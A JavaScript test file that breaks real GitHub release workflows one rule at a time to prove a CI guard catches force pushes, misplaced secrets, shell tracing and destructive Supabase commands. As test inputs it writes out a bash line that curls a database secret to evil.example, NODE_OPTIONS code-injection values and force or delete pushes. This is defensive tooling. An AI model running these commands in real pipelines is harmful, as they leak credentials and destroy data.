/**
 * tools/check-release-workflows.mjs's `problems()`, driven red on purpose.
 *
 *   node tools/test-release-workflows.mjs
 *
 * Every case starts from the real workflow files and netlify.toml read from disk and
 * breaks exactly one thing, because a guard proved against a synthetic fixture proves only
 * that it can read the fixture. The last case asserts the real files pass, so a
 * `problems()` that has gone quiet fails here rather than reading as green.
 */
import fs from 'node:fs';
import { parse, stringify } from 'yaml';
import { problems, readFiles } from './check-release-workflows.mjs';

const REAL = readFiles();
const RELEASE = '.github/workflows/release.yml';
const BUILD = '.github/workflows/build.yml';
const SQL = '.github/workflows/sql.yml';
const WEB = '.github/workflows/web.yml';
const REHEARSAL = '.github/workflows/rehearsal.yml';
const JOB_HEALTH = '.github/workflows/job-health.yml';
const MIGRATION_ORDER = '.github/workflows/migration-order.yml';
const NETLIFY = 'netlify.toml';

let failures = 0;

/** A copy of the real files with one workflow edited as a parsed object, then written back. */
const edit = (path, fn) => {
  const doc = parse(REAL[path] ?? '');
  fn(doc);
  return { ...REAL, [path]: stringify(doc) };
};
const without = (path) => {
  const copy = { ...REAL };
  delete copy[path];
  return copy;
};
const pushStep = (doc) => doc.jobs.promote.steps.find((s) => typeof s.run === 'string' && /git push/.test(s.run));

/** @param {string} name @param {Record<string,string>} files @param {RegExp} expected */
function red(name, files, expected) {
  const found = problems(files);
  if (found.some((p) => expected.test(p))) {
    console.log(`ok    ${name}`);
    return;
  }
  failures += 1;
  console.error(`FAIL  ${name}`);
  console.error(`      expected a complaint matching ${expected}`);
  console.error(found.length ? `      got:${found.map((f) => `\n        - ${f}`).join('')}` : '      got: no complaints at all');
}

/** @param {string} name @param {Record<string,string>} files */
function quiet(name, files) {
  const found = problems(files);
  if (found.length === 0) {
    console.log(`ok    ${name}`);
    return;
  }
  failures += 1;
  console.error(`FAIL  ${name}`);
  console.error(`      expected no complaints, got:${found.map((f) => `\n        - ${f}`).join('')}`);
}

/* ---- R1: the jobs and the chain ---- */
red('release.yml is missing', without(RELEASE), /release\.yml.*R1|R1.*release\.yml/);
red('web is dropped from the jobs', edit(RELEASE, (d) => { delete d.jobs.web; }), /R1/);
red('promote skips web', edit(RELEASE, (d) => { d.jobs.promote.needs = ['candidate', 'sql']; }), /R1/);
red('sql does not need build', edit(RELEASE, (d) => { d.jobs.sql.needs = ['candidate']; }), /R1.*sql does not need build/);
red('web does not need sql', edit(RELEASE, (d) => { d.jobs.web.needs = ['candidate', 'build']; }), /R1.*web does not need sql/);

/* ---- R2: each job calls its own workflow on the candidate ---- */
red('sql releases main, not the candidate', edit(RELEASE, (d) => { d.jobs.sql.with.ref = 'main'; }), /R2/);
red('build calls web.yml', edit(RELEASE, (d) => { d.jobs.build.uses = './.github/workflows/web.yml'; }), /R2/);
red('web releases main, not the candidate', edit(RELEASE, (d) => { d.jobs.web.with.ref = 'main'; }), /R2/);

/* ---- R3: promote only fast-forwards, with the least permission ---- */
red('promote pushes with --force', edit(RELEASE, (d) => {
  const s = pushStep(d);
  s.run = s.run.replace('git push origin', 'git push --force origin');
}), /R3/);
red('promote pushes a + refspec', edit(RELEASE, (d) => {
  const s = pushStep(d);
  s.run = s.run.replace('origin "', 'origin "+');
}), /R3/);
red('promote pushes to main', edit(RELEASE, (d) => {
  const s = pushStep(d);
  s.run = s.run.replace('refs/heads/production', 'refs/heads/main');
}), /R3/);
red('promote pushes with -f', edit(RELEASE, (d) => {
  const s = pushStep(d);
  s.run = s.run.replace('git push origin', 'git push -f origin');
}), /R3.*-f/);
red('promote pushes with --force-with-lease', edit(RELEASE, (d) => {
  const s = pushStep(d);
  s.run = s.run.replace('git push origin', 'git push --force-with-lease origin');
}), /R3/);
red('promote pushes with --delete', edit(RELEASE, (d) => {
  const s = pushStep(d);
  s.run = s.run.replace('git push origin', 'git push --delete origin');
}), /R3/);
red('promote pushes with --mirror', edit(RELEASE, (d) => {
  const s = pushStep(d);
  s.run = s.run.replace('git push origin', 'git push --mirror origin');
}), /R3/);
red('promote pushes with --prune', edit(RELEASE, (d) => {
  const s = pushStep(d);
  s.run = s.run.replace('git push origin', 'git push --prune origin');
}), /R3/);
red('promote deletes production by an empty source', edit(RELEASE, (d) => {
  const s = pushStep(d);
  s.run = 'git push origin :refs/heads/production';
}), /R3/);
red('promote has no git push at all', edit(RELEASE, (d) => {
  const s = pushStep(d);
  s.run = 'echo promoted';
}), /R3.*no git push/);
red('report force-pushes production', edit(RELEASE, (d) => {
  d.jobs.report.steps.push({ run: 'git push --force origin HEAD:refs/heads/production' });
}), /R3.*report/);
red('a new job pushes', edit(RELEASE, (d) => {
  d.jobs.extra = { 'runs-on': 'ubuntu-latest', steps: [{ run: 'git push origin HEAD:refs/heads/other' }] };
}), /R3.*extra/);
red('promote asks pull-requests: write too', edit(RELEASE, (d) => { d.jobs.promote.permissions['pull-requests'] = 'write'; }), /R3/);

/* ---- R4: the release runs on a schedule and a bare dispatch, nothing else ---- */
red('release.yml runs on push', edit(RELEASE, (d) => { d.on.push = { branches: ['main'] }; }), /R4/);
red('the schedule is empty', edit(RELEASE, (d) => { d.on.schedule = []; }), /R4.*empty schedule/);
red('the dispatch takes a sha', edit(RELEASE, (d) => { d.on.workflow_dispatch = { inputs: { sha: { type: 'string' } } }; }), /R4/);

/* ---- R5: the called workflows take a ref and use it ---- */
red('web.yml loses workflow_call', edit(WEB, (d) => { delete d.on.workflow_call; }), /R5/);
red('web.yml does not require its ref', edit(WEB, (d) => { d.on.workflow_call.inputs.ref.required = false; }), /R5.*required/);
red('build.yml has no checkout', edit(BUILD, (d) => {
  for (const job of Object.values(d.jobs)) job.steps = (job.steps ?? []).filter((s) => !String(s.uses ?? '').startsWith('actions/checkout'));
}), /R5.*no checkout/);
red('sql.yml checks out without the ref', edit(SQL, (d) => {
  for (const job of Object.values(d.jobs)) {
    for (const step of job.steps ?? []) if (String(step.uses ?? '').startsWith('actions/checkout')) delete step.with;
  }
}), /R5/);

/* ---- R6: production moves in release.yml and nowhere else ---- */
red('build.yml pushes HEAD:refs/heads/production', edit(BUILD, (d) => {
  const job = Object.values(d.jobs)[0];
  job.steps.push({ run: 'git push origin HEAD:refs/heads/production' });
}), /R6/);
red('build.yml runs on push', edit(BUILD, (d) => { d.on.push = { branches: ['main'] }; }), /R6/);
red('build.yml pushes a refspec held in a variable', edit(BUILD, (d) => {
  const job = Object.values(d.jobs)[0];
  job.steps.push({ run: 'spec=HEAD:production\ngit push origin "$spec"' });
}), /R6/);
red('build.yml pushes with options before push', edit(BUILD, (d) => {
  Object.values(d.jobs)[0].steps.push({ run: 'git -C . push origin HEAD:production' });
}), /R6/);
red('build.yml pushes with -c before push', edit(BUILD, (d) => {
  Object.values(d.jobs)[0].steps.push({ run: 'git -c k=v push origin HEAD:production' });
}), /R6/);
red('build.yml pushes a refspec held in a step env', edit(BUILD, (d) => {
  Object.values(d.jobs)[0].steps.push({ env: { TARGET: 'HEAD:refs/heads/production' }, run: 'git push origin "$TARGET"' });
}), /R6/);
red('build.yml names production in a step input', edit(BUILD, (d) => {
  Object.values(d.jobs)[0].steps.push({ uses: 'actions/some-action@v1', with: { branch: 'production' } });
}), /R6.*inputs/);
/* ---- R6 again: migration-order.yml is the one workflow allowed to run on push, to main only, read-only, with no secret or Environment (#1215, owner's option 1) ---- */
quiet('the real migration-order.yml passes', REAL);
const moJob = (d) => Object.values(d.jobs)[0];
red('migration-order.yml runs on push with no branches filter', edit(MIGRATION_ORDER, (d) => { d.on.push = null; }), /migration-order\.yml.*R6.*main/);
red('migration-order.yml runs on push to main and dev', edit(MIGRATION_ORDER, (d) => { d.on.push.branches = ['main', 'dev']; }), /migration-order\.yml.*R6.*main/);
red('migration-order.yml runs on push to every branch', edit(MIGRATION_ORDER, (d) => { d.on.push.branches = ['**']; }), /migration-order\.yml.*R6.*main/);
red('migration-order.yml runs on push to a branch other than main', edit(MIGRATION_ORDER, (d) => { d.on.push.branches = ['production']; }), /migration-order\.yml.*R6.*main/);
red('migration-order.yml is also triggered by tags', edit(MIGRATION_ORDER, (d) => { d.on.push.tags = ['v*']; }), /migration-order\.yml.*R6.*main/);
red('migration-order.yml widens itself with paths', edit(MIGRATION_ORDER, (d) => { d.on.push.paths = ['**']; }), /migration-order\.yml.*R6.*main/);
red('migration-order.yml ignores a branch instead of naming main', edit(MIGRATION_ORDER, (d) => { d.on.push = { 'branches-ignore': ['production'] }; }), /migration-order\.yml.*R6.*main/);
red('migration-order.yml is also triggered by pull_request_target', edit(MIGRATION_ORDER, (d) => { d.on.pull_request_target = {}; }), /migration-order\.yml.*R6/);
red('migration-order.yml is also triggered by a schedule', edit(MIGRATION_ORDER, (d) => { d.on.schedule = [{ cron: '0 * * * *' }]; }), /migration-order\.yml.*R6/);
red('migration-order.yml runs on push as a bare string', edit(MIGRATION_ORDER, (d) => { d.on = 'push'; }), /migration-order\.yml.*R6/);
red('migration-order.yml may write contents', edit(MIGRATION_ORDER, (d) => { d.permissions.contents = 'write'; }), /migration-order\.yml.*R6.*contents: read/);
red('migration-order.yml takes an extra permission', edit(MIGRATION_ORDER, (d) => { d.permissions['pull-requests'] = 'read'; }), /migration-order\.yml.*R6.*contents: read/);
red('migration-order.yml has no permissions key', edit(MIGRATION_ORDER, (d) => { delete d.permissions; }), /migration-order\.yml.*R6.*contents: read/);
red('migration-order.yml\'s job widens its permissions', edit(MIGRATION_ORDER, (d) => { moJob(d).permissions = { contents: 'write' }; }), /migration-order\.yml.*R6.*contents: read/);
red('migration-order.yml names a secret in a step', edit(MIGRATION_ORDER, (d) => { moJob(d).steps.push({ env: { T: '${{ secrets.GITHUB_PAT }}' }, run: 'true' }); }), /migration-order\.yml.*R6.*secret/);
red('migration-order.yml names a secret in a run line', edit(MIGRATION_ORDER, (d) => { moJob(d).steps.push({ run: 'echo ${{ secrets.X }}' }); }), /migration-order\.yml.*R6.*secret/);
red('migration-order.yml reads toJSON(secrets)', edit(MIGRATION_ORDER, (d) => { d.env = { ALL: '${{ toJSON(secrets) }}' }; }), /migration-order\.yml.*R6.*secret/);
red('migration-order.yml names a secret at the workflow level', edit(MIGRATION_ORDER, (d) => { d.env = { T: '${{ secrets.X }}' }; }), /migration-order\.yml.*R6.*secret/);
red('migration-order.yml\'s job names an Environment', edit(MIGRATION_ORDER, (d) => { moJob(d).environment = 'production'; }), /migration-order\.yml.*R(6|10).*nvironment/);
red('migration-order.yml\'s job names an Environment in its object form', edit(MIGRATION_ORDER, (d) => { moJob(d).environment = { name: 'staging' }; }), /migration-order\.yml.*R6.*nvironment/);
red('migration-order.yml pushes to production', edit(MIGRATION_ORDER, (d) => { moJob(d).steps.push({ run: 'git push origin HEAD:refs/heads/production' }); }), /migration-order\.yml.*R6.*production/);
red('build.yml also runs on push to main', edit(BUILD, (d) => { d.on.push = { branches: ['main'] }; }), /build\.yml.*R6.*push/);
red('web.yml also runs on push', edit(WEB, (d) => { d.on = { ...d.on, push: { branches: ['main'] } }; }), /web\.yml.*R6.*push/);
red('a new workflow runs on push to main', { ...REAL, '.github/workflows/other.yml': 'name: Other\non:\n  push:\n    branches: [main]\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n      - run: true\n' }, /other\.yml.*R6.*push/);
red('release.yml runs on push', edit(RELEASE, (d) => { d.on.push = { branches: ['main'] }; }), /release\.yml.*R6.*push/);
quiet('a shell comment line inside a run string is not a push', edit(BUILD, (d) => {
  Object.values(d.jobs)[0].steps.push({ run: '# git push origin HEAD:production\necho fine' });
}));
quiet('a git command whose words include push is not a push', edit(RELEASE, (d) => {
  d.jobs.report.steps.push({ run: 'git log --oneline push-fix\ngit commit -m "fix push"\ngit checkout -b push/x' });
}));
quiet('a comment that mentions production is not a push', {
  ...REAL,
  [BUILD]: `${REAL[BUILD]}\n# git push origin HEAD:production would be wrong here; only release.yml moves production.\n`,
});

/* ---- R7: production builds what a branch deploy builds ---- */
red('netlify.toml gives production its own command', {
  ...REAL,
  [NETLIFY]: `${REAL[NETLIFY]}\n[context.production]\n  command = "npm run build"\n`,
}, /R7/);

red('netlify.toml gives deploy previews their own command', {
  ...REAL,
  [NETLIFY]: `${REAL[NETLIFY]}\n[context.deploy-preview]\n  command = "npm run build"\n`,
}, /R7.*deploy-preview/);

/* ---- R8: every Postgres service names one image, by version and digest ---- */
const pgImage = (doc, image) => {
  for (const job of Object.values(doc.jobs)) if (job.services?.postgres) job.services.postgres.image = image;
};
/** R8's two complaints, told apart: an image not written by version and digest, and two images that differ. */
const UNPINNED = /R8 job \S+ service \S+ image .* is not postgres:<version>@sha256/;
red('sql.yml is back on the postgres:17 tag', edit(SQL, (d) => pgImage(d, 'postgres:17')), UNPINNED);
red('rehearsal.yml names a different digest than sql.yml', edit(REHEARSAL, (d) => {
  pgImage(d, `postgres:17.11@sha256:${'0'.repeat(64)}`);
}), /R8 the Postgres images differ/);
red('a postgres image with a tag and no digest', edit(SQL, (d) => pgImage(d, 'postgres:17.11')), UNPINNED);
red('a registry-prefixed postgres image is held to the rule too', edit(SQL, (d) => pgImage(d, 'docker.io/library/postgres:17')), UNPINNED);
quiet('another publisher\'s image named postgres is not the official one, and is not held to R8', edit(SQL, (d) => pgImage(d, 'supabase/postgres:15.1.0.147')));
quiet('a service that is not a postgres image is not held to R8', edit(SQL, (d) => {
  for (const job of Object.values(d.jobs)) if (job.services) job.services.cache = { image: 'redis:7' };
}));

/* ---- R9: the e2e shards are one list, and the command takes its total from it ---- */
const E2E_RUN = 'npm run test:e2e -- --cost-shard=${{ matrix.shard }}/${{ strategy.job-total }}';
const list = (v) => (Array.isArray(v) ? v : []);
const e2eJob = (d) => Object.values(d.jobs).find((j) => list(j.steps).some((s) => /npm run test:e2e/.test(String(s.run ?? ''))));
const e2eStep = (d) => e2eJob(d).steps.find((s) => /npm run test:e2e/.test(String(s.run ?? '')));
/** web.yml with the e2e job made conforming, then broken by `fn` (the real file is checked on its own, last). */
const shards = (fn) => edit(WEB, (d) => {
  e2eStep(d).run = E2E_RUN;
  e2eJob(d).strategy.matrix = { shard: [1, 2, 3] };
  fn(d);
});
quiet('a conforming e2e job passes', shards(() => {}));
red('the shard list has a gap', shards((d) => { e2eJob(d).strategy.matrix.shard = [1, 2, 4]; }), /R9.*shard list/);
red('the shard list has a repeat', shards((d) => { e2eJob(d).strategy.matrix.shard = [1, 2, 2]; }), /R9.*shard list/);
red('the shard list does not start at 1', shards((d) => { e2eJob(d).strategy.matrix.shard = [2, 3, 4]; }), /R9.*shard list/);
red('the matrix has a second key', shards((d) => { e2eJob(d).strategy.matrix.os = ['a', 'b']; }), /R9.*only key/);
red('the matrix has an include', shards((d) => { e2eJob(d).strategy.matrix.include = [{ shard: 4 }]; }), /R9.*only key/);
red('the command has a literal total', shards((d) => { e2eStep(d).run = 'npm run test:e2e -- --shard=${{ matrix.shard }}/3'; }), /R9.*command/);
red('the command has no --shard', shards((d) => { e2eStep(d).run = 'npm run test:e2e'; }), /R9.*command/);
red('the total has a suffix, so the shards run a sixtieth each', shards((d) => { e2eStep(d).run = `${E2E_RUN}0`; }), /R9.*command/);
red('the shard flag is only in a shell comment', shards((d) => { e2eStep(d).run = `npm run test:e2e # ${E2E_RUN}`; }), /R9.*command/);
red('the shard flag is given twice', shards((d) => { e2eStep(d).run = `${E2E_RUN} --shard=1/1`; }), /R9.*command/);
red('the command is the old count cut, --shard=', shards((d) => { e2eStep(d).run = 'npm run test:e2e -- --shard=${{ matrix.shard }}/${{ strategy.job-total }}'; }), /R9.*command/);
red('the cost-shard total is a literal 7', shards((d) => { e2eStep(d).run = 'npm run test:e2e -- --cost-shard=${{ matrix.shard }}/7'; }), /R9.*command/);
red('the cost-shard total has a second total after it', shards((d) => { e2eStep(d).run = `${E2E_RUN}/7`; }), /R9.*command/);
red('the cost-shard flag is only in a comment after the old count cut', shards((d) => { e2eStep(d).run = `npm run test:e2e -- --shard=\${{ matrix.shard }}/\${{ strategy.job-total }} # --cost-shard=\${{ matrix.shard }}/\${{ strategy.job-total }}`; }), /R9.*command/);
red('the shard list is empty', shards((d) => { e2eJob(d).strategy.matrix.shard = []; }), /R9.*shard list/);
red('the shard list is one number, not a list', shards((d) => { e2eJob(d).strategy.matrix.shard = 3; }), /R9.*shard list/);
red('the job has no matrix', shards((d) => { delete e2eJob(d).strategy.matrix; }), /R9.*only key.*no matrix/);
red('no job runs the e2e suite', shards((d) => { e2eStep(d).run = 'echo skipped'; }), /R9.*no job runs/);

/* ---- R1 again: the backend jobs sit between web and promote ---- */
red('seed is dropped from the jobs', edit(RELEASE, (d) => { delete d.jobs.seed; }), /R1.*seed/);
red('promote needs web, skipping the backend', edit(RELEASE, (d) => { d.jobs.promote.needs = ['candidate', 'web']; }), /R1.*promote does not need seed/);
red('schema does not need web', edit(RELEASE, (d) => { d.jobs.schema.needs = ['candidate']; }), /R1.*schema does not need web/);
red('functions does not need schema', edit(RELEASE, (d) => { d.jobs.functions.needs = ['candidate']; }), /R1.*functions does not need schema/);
red('seed does not need functions', edit(RELEASE, (d) => { d.jobs.seed.needs = ['candidate']; }), /R1.*seed does not need functions/);

/* ---- R10: only the three backend jobs name the production Environment, and each does ---- */
red('functions has no environment', edit(RELEASE, (d) => { delete d.jobs.functions.environment; }), /R10.*functions/);
red('seed names another environment', edit(RELEASE, (d) => { d.jobs.seed.environment = 'staging'; }), /R10.*seed/);
red('build.yml has a job with environment production', edit(BUILD, (d) => {
  Object.values(d.jobs)[0].environment = 'production';
}), /build\.yml.*R10/);
red('report names environment production', edit(RELEASE, (d) => { d.jobs.report.environment = 'production'; }), /R10.*report/);

/* ---- R11: the secrets are named by the three backend jobs only, and only through env ---- */
const backendStep = (d, job) => d.jobs[job].steps.find((s) => s.env && Object.keys(s.env).some((k) => /SUPABASE|KAYFABB/.test(k)));
red('web.yml names secrets.SUPABASE_DB_URL', edit(WEB, (d) => {
  Object.values(d.jobs)[0].steps.push({ env: { X: '${{ secrets.SUPABASE_DB_URL }}' }, run: 'echo hi' });
}), /web\.yml.*R11/);
red('promote gets KAYFABB_JOBS_KEY in its env', edit(RELEASE, (d) => {
  d.jobs.promote.steps[1].env = { KAYFABB_JOBS_KEY: '${{ secrets.KAYFABB_JOBS_KEY }}' };
}), /R11.*promote/);
red('schema interpolates a secret inside its run line', edit(RELEASE, (d) => {
  d.jobs.schema.steps.push({ run: 'echo ${{ secrets.SUPABASE_DB_URL }}' });
}), /R11.*schema.*run line/);
red('seed passes its key from a literal, not a secret', edit(RELEASE, (d) => {
  backendStep(d, 'seed').env.KAYFABB_JOBS_KEY = 'abc';
}), /R11.*seed/);

/* ---- R12: no destructive or secret-printing command ---- */
const schemaRun = (d, fn) => { const s = d.jobs.schema.steps.find((x) => /db push/.test(x.run ?? '')); s.run = fn(s.run); };
red('schema runs supabase db push --include-all', edit(RELEASE, (d) => {
  schemaRun(d, (r) => r.replace(/db push/, 'db push --include-all'));
}), /R12.*include-all/);
red('a backend job runs supabase db reset', edit(RELEASE, (d) => {
  d.jobs.schema.steps.push({ run: 'npx supabase db reset --linked' });
}), /R12.*db reset/);
red('functions runs supabase functions delete', edit(RELEASE, (d) => {
  d.jobs.functions.steps.push({ run: 'npx supabase functions delete seed' });
}), /R12.*functions delete/);
red('build.yml runs --include-all', edit(BUILD, (d) => {
  Object.values(d.jobs)[0].steps.push({ run: 'npx supabase db push --include-all' });
}), /build\.yml.*R12/);
red('a backend job traces its shell with set -x', edit(RELEASE, (d) => {
  d.jobs.seed.steps.push({ run: 'set -x\necho go' });
}), /R12.*traces/);
red('a backend job traces its shell with set -euxo', edit(RELEASE, (d) => {
  d.jobs.functions.steps.push({ run: 'set -euxo pipefail\necho go' });
}), /R12.*traces/);

const shellStep = (d, job, fn) => { const st = d.jobs[job].steps.find((x) => /curl|supabase/.test(x.run ?? '')); fn(st); return st; };
red('a backend step sets its shell to bash -x', edit(RELEASE, (d) => { shellStep(d, 'functions', (st) => { st.shell = 'bash -x {0}'; }); }), /R12.*traces/);
red('a backend job defaults its shell to bash -x', edit(RELEASE, (d) => { d.jobs.seed.defaults = { run: { shell: 'bash -ex {0}' } }; }), /R12.*traces/);
red('a backend step traces through a later flag group', edit(RELEASE, (d) => { shellStep(d, 'schema', (st) => { st.shell = 'bash --noprofile --norc -e -x {0}'; }); }), /R12.*traces/);
red('a backend step traces with sh -x', edit(RELEASE, (d) => { shellStep(d, 'seed', (st) => { st.shell = 'sh -x {0}'; }); }), /R12.*traces/);
red('the workflow defaults its shell to bash -x', edit(RELEASE, (d) => { d.defaults = { run: { shell: 'bash -x {0}' } }; }), /R12.*traces/);
red('a backend job runs db push --debug', edit(RELEASE, (d) => {
  schemaRun(d, (r) => r.replace(/db push/, 'db push --debug'));
}), /R12.*--debug/);
red('--include-all split across a line continuation', edit(RELEASE, (d) => {
  schemaRun(d, (r) => r.replace(/db push --yes/, 'db push --yes \\\n  --include-all'));
}), /R12.*include-all \(.*db push --yes\s+--include-all/);

/* ---- R11 again: release.yml's own top level ---- */
red('release.yml names a secret in a workflow-level env', edit(RELEASE, (d) => { d.env = { DB: '${{ secrets.SUPABASE_DB_URL }}' }; }), /release\.yml.*R11.*outside a job/);

/* ---- R10 again: the object form of environment ---- */
red('a non-backend job names environment in its object form', edit(RELEASE, (d) => { d.jobs.report.environment = { name: 'production' }; }), /R10.*report/);


/* ---- R10, R11, R12 and R17: job-health.yml's one job in the production Environment, its one secret, and its shape ---- */
const jhJob = (d) => d.jobs.check;
const jhStep = (d) => jhJob(d).steps.find((s) => /check-job-health/.test(s.run ?? ''));
quiet('job-health.yml, as written, holds its shape', edit(JOB_HEALTH, () => {}));
red('job-health.yml is missing', without(JOB_HEALTH), /job-health\.yml.*R17.*missing/);
red('job-health.yml gains a pull_request trigger', edit(JOB_HEALTH, (d) => { d.on.pull_request = null; }), /job-health\.yml.*R17.*pull_request/);
red('job-health.yml gains a pull_request_target trigger', edit(JOB_HEALTH, (d) => { d.on.pull_request_target = {}; }), /job-health\.yml.*R17.*pull_request_target/);
red('job-health.yml gains a push trigger', edit(JOB_HEALTH, (d) => { d.on.push = { branches: ['main'] }; }), /job-health\.yml.*R17.*push/);
red('job-health.yml loses workflow_dispatch', edit(JOB_HEALTH, (d) => { delete d.on.workflow_dispatch; }), /job-health\.yml.*R17.*workflow_dispatch/);
red('job-health.yml runs on another cron', edit(JOB_HEALTH, (d) => { d.on.schedule = [{ cron: '*/5 * * * *' }]; }), /job-health\.yml.*R17.*cron/);
red('job-health.yml gains a second schedule', edit(JOB_HEALTH, (d) => { d.on.schedule.push({ cron: '9 * * * *' }); }), /job-health\.yml.*R17.*cron/);
red('job-health.yml gains a second job', edit(JOB_HEALTH, (d) => { d.jobs.extra = { 'runs-on': 'ubuntu-latest', environment: 'production', steps: [{ run: 'echo hi' }] }; }), /job-health\.yml.*R17.*exactly one job/);
red('job-health\'s job drops the production Environment', edit(JOB_HEALTH, (d) => { delete jhJob(d).environment; }), /job-health\.yml.*R10.*check/);
red('job-health\'s job names another Environment', edit(JOB_HEALTH, (d) => { jhJob(d).environment = 'staging'; }), /job-health\.yml.*R10.*check/);
red('job-health\'s step also reads the jobs key', edit(JOB_HEALTH, (d) => { jhStep(d).env.KAYFABB_JOBS_KEY = '${{ secrets.KAYFABB_JOBS_KEY }}'; }), /job-health\.yml.*R11.*KAYFABB_JOBS_KEY/);
red('job-health\'s step reads the project ref too', edit(JOB_HEALTH, (d) => { jhStep(d).env.SUPABASE_PROJECT_REF = '${{ secrets.SUPABASE_PROJECT_REF }}'; }), /job-health\.yml.*R11/);
red('job-health\'s step reads some other secret', edit(JOB_HEALTH, (d) => { jhStep(d).env.TOKEN = '${{ secrets.GITHUB_PAT }}'; }), /job-health\.yml.*R11.*GITHUB_PAT/);
red('job-health reads a secret in a run line', edit(JOB_HEALTH, (d) => { jhJob(d).steps.push({ run: 'echo ${{ secrets.SUPABASE_DB_URL }}' }); }), /job-health\.yml.*R11.*run line/);
red('job-health\'s SUPABASE_DB_URL comes from a literal', edit(JOB_HEALTH, (d) => { jhStep(d).env.SUPABASE_DB_URL = 'postgres://x'; }), /job-health\.yml.*R11.*SUPABASE_DB_URL/);
red('job-health names the secret in a workflow-level env', edit(JOB_HEALTH, (d) => { d.env = { DB: '${{ secrets.SUPABASE_DB_URL }}' }; }), /job-health\.yml.*R11.*outside a job/);
red('job-health names the secret at the job level', edit(JOB_HEALTH, (d) => { jhJob(d).env = { SUPABASE_DB_URL: '${{ secrets.SUPABASE_DB_URL }}' }; }), /job-health\.yml.*R11.*outside a step/);
red('job-health traces its shell with set -x', edit(JOB_HEALTH, (d) => { jhStep(d).run = `set -x\n${jhStep(d).run}`; }), /job-health\.yml.*R12.*traces/);
red('job-health runs a shell with -x', edit(JOB_HEALTH, (d) => { jhStep(d).shell = 'bash -x {0}'; }), /job-health\.yml.*R12.*traces/);
red('job-health runs --debug', edit(JOB_HEALTH, (d) => { jhJob(d).steps.push({ run: 'npx supabase db push --debug' }); }), /job-health\.yml.*R12.*--debug/);
red('job-health runs the check without the secret', edit(JOB_HEALTH, (d) => { jhStep(d).run = 'node tools/check-job-health.mjs --db postgres://x'; }), /job-health\.yml.*R17.*one command/);
red('job-health runs a second command beside the check', edit(JOB_HEALTH, (d) => { jhStep(d).run += '\ncurl -X POST https://example.com'; }), /job-health\.yml.*R17.*one command/);
red('job-health runs a step the shape does not list', edit(JOB_HEALTH, (d) => { jhJob(d).steps.push({ run: 'echo hi' }); }), /job-health\.yml.*R17.*one command|R17.*step/);
red('job-health never runs the check', edit(JOB_HEALTH, (d) => { jhJob(d).steps = jhJob(d).steps.filter((s) => s !== jhStep(d)); }), /job-health\.yml.*R17.*one command/);
red('job-health continues on error', edit(JOB_HEALTH, (d) => { jhStep(d)['continue-on-error'] = true; }), /job-health\.yml.*R17.*continue-on-error/);
red('release.yml may not take job-health\'s allowance: a job named check there', edit(RELEASE, (d) => { d.jobs.check = { 'runs-on': 'ubuntu-latest', environment: 'production', steps: [] }; }), /release\.yml.*R10.*check/);
red('job-health\'s job has an if that skips it', edit(JOB_HEALTH, (d) => { jhJob(d).if = 'false'; }), /job-health\.yml.*R17.*if/);
red('job-health\'s check step has an if that skips it', edit(JOB_HEALTH, (d) => { jhStep(d).if = 'false'; }), /job-health\.yml.*R17.*if/);
red('job-health uses an action the shape does not list', edit(JOB_HEALTH, (d) => { jhJob(d).steps.push({ uses: 'some/action@v1' }); }), /job-health\.yml.*R17.*uses/);
// R11: every `secrets` in job-health.yml is exactly secrets.SUPABASE_DB_URL, however it is spelled.
red('job-health reads toJSON(secrets)', edit(JOB_HEALTH, (d) => { jhStep(d).env.ALL = '${{ toJSON(secrets) }}'; }), /job-health\.yml.*R11.*secrets/);
red('job-health reads secrets by index', edit(JOB_HEALTH, (d) => { jhStep(d).env.X = "${{ secrets['KAYFABB_JOBS_KEY'] }}"; }), /job-health\.yml.*R11.*secrets/);
red('job-health reads secrets by a built name', edit(JOB_HEALTH, (d) => { jhStep(d).env.X = "${{ secrets[format('KAYFABB_{0}', 'JOBS_KEY')] }}"; }), /job-health\.yml.*R11.*secrets/);
red('job-health names secrets in a workflow-level env', edit(JOB_HEALTH, (d) => { d.env = { ALL: '${{ toJSON(secrets) }}' }; }), /job-health\.yml.*R11.*secrets/);
// R17: only the check step has env, and it is exactly the one secret; uses are anchored and carry only what the shape lists.
red('job-health puts the secret on the npm ci step', edit(JOB_HEALTH, (d) => { jhJob(d).steps.find((s) => /npm ci/.test(s.run ?? '')).env = { SUPABASE_DB_URL: '${{ secrets.SUPABASE_DB_URL }}' }; }), /job-health\.yml.*R17.*env/);
red('job-health sets NODE_OPTIONS beside the secret', edit(JOB_HEALTH, (d) => { jhStep(d).env.NODE_OPTIONS = '--require ./evil.cjs'; }), /job-health\.yml.*R17.*env/);
red('job-health has a job-level env', edit(JOB_HEALTH, (d) => { jhJob(d).env = { NODE_OPTIONS: '--require ./evil.cjs' }; }), /job-health\.yml.*R17.*env/);
red('job-health has a workflow-level env', edit(JOB_HEALTH, (d) => { d.env = { NODE_OPTIONS: '--require ./evil.cjs' }; }), /job-health\.yml.*R17.*env/);
red('job-health checks out another ref', edit(JOB_HEALTH, (d) => { jhJob(d).steps[0].with = { ref: 'evil' }; }), /job-health\.yml.*R17.*with/);
red('job-health checks out another repository', edit(JOB_HEALTH, (d) => { jhJob(d).steps[0].with = { repository: 'evil/repo' }; }), /job-health\.yml.*R17.*with/);
red('job-health uses a checkout path that is not the action', edit(JOB_HEALTH, (d) => { jhJob(d).steps[0].uses = 'actions/checkout@v4/../evil'; }), /job-health\.yml.*R17.*uses/);
red('job-health gives setup-node another with key', edit(JOB_HEALTH, (d) => { jhJob(d).steps[1].with['registry-url'] = 'https://evil.example'; }), /job-health\.yml.*R17.*with/);
// R17 whitelists keys: a key the check never read could carry the secret to unreviewed code while the check stays green.
const SHELL_EVIL = "bash -c 'curl -d \"$SUPABASE_DB_URL\" https://evil.example; exit 0' {0}";
const npmCi = (d) => jhJob(d).steps.find((s) => /npm ci/.test(s.run ?? ''));
red('job-health\'s check step names a shell', edit(JOB_HEALTH, (d) => { jhStep(d).shell = SHELL_EVIL; }), /job-health\.yml.*R17.*shell/);
red('job-health\'s npm ci step names a shell', edit(JOB_HEALTH, (d) => { npmCi(d).shell = SHELL_EVIL; }), /job-health\.yml.*R17.*shell/);
red('job-health\'s job sets defaults.run.shell', edit(JOB_HEALTH, (d) => { jhJob(d).defaults = { run: { shell: SHELL_EVIL } }; }), /job-health\.yml.*R17.*defaults/);
red('job-health\'s job sets defaults.run.working-directory', edit(JOB_HEALTH, (d) => { jhJob(d).defaults = { run: { 'working-directory': 'evil' } }; }), /job-health\.yml.*R17.*defaults/);
